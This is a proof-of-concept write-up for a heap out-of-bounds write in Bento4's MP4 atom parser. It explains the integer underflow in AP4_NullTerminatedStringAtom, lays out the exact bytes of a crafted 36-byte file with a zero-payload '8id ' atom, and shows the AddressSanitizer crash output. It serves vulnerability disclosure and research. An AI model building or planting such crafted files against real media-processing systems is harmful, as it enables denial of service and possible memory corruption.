# PoC Notes: Heap OOB Write in AP4_NullTerminatedStringAtom

## Vulnerability

- **File**: Bento4/Source/C++/Core/Ap4Atom.cpp, lines 470-473
- **Type**: CWE-787 Out-of-bounds Write (Heap)
- **Severity**: High

## Root Cause

In the `AP4_NullTerminatedStringAtom` constructor:

```cpp
AP4_Size str_size = (AP4_Size)size - AP4_ATOM_HEADER_SIZE;
char* str = new char[str_size];       // When str_size==0: new char[0] returns valid ptr
stream.Read(str, str_size);           // Reads 0 bytes -- harmless
str[str_size-1] = '\0';               // str[0-1] = str[0xFFFFFFFF] = '\0' -- OOB WRITE!
```

When `size == 8` (equal to `AP4_ATOM_HEADER_SIZE`):
- `str_size = 8 - 8 = 0`
- `new char[0]` returns a valid non-null pointer (implementation-defined but common)
- `stream.Read(str, 0)` writes nothing -- harmless
- `str[str_size - 1]` = `str[(AP4_UI32)0 - 1]` = `str[0xFFFFFFFF]` -- writes `'\0'` 4294967295 bytes past the heap allocation

This is a guaranteed out-of-bounds write that causes SIGSEGV on 64-bit systems because the computed address (`str + 4294967295`) falls outside any mapped memory region.

## Trigger Mechanism

The vulnerability is triggered by parsing an atom of type `8id ` (bytes: `0x38 0x69 0x64 0x20` -- note: lowercase 'i','d' with a trailing space 0x20). The C++ constant is named `AP4_ATOM_TYPE_8ID_` but its actual value is `AP4_ATOM_TYPE('8','i','d',' ')`. The `AP4_DefaultAtomFactory` size check only rejects atoms with `size < 8`; `size == 8` passes and reaches the vulnerable constructor at Ap4AtomFactory.cpp line 524-525.

## PoC Structure

```
[ftyp box - 20 bytes]
  size=20, type="ftyp", payload: "mp42" + 0x00000000 + "mp42"
[moov box - 16 bytes]
  size=16, type="moov"
  [8id  atom - 8 bytes]  <-- MALICIOUS
    size=8, type="8id " (0x38 0x69 0x64 0x20), no data
```

## Observed Behavior (ASAN)

ASAN reported:
```
ERROR: AddressSanitizer: SEGV on unknown address 0x50210000008f
The signal is caused by a WRITE memory access.
#0 AP4_NullTerminatedStringAtom::AP4_NullTerminatedStringAtom(...)
```

The crash is a confirmed WRITE fault at an address ~0xFFFFFFFF bytes past the heap allocation.

## NNN

001
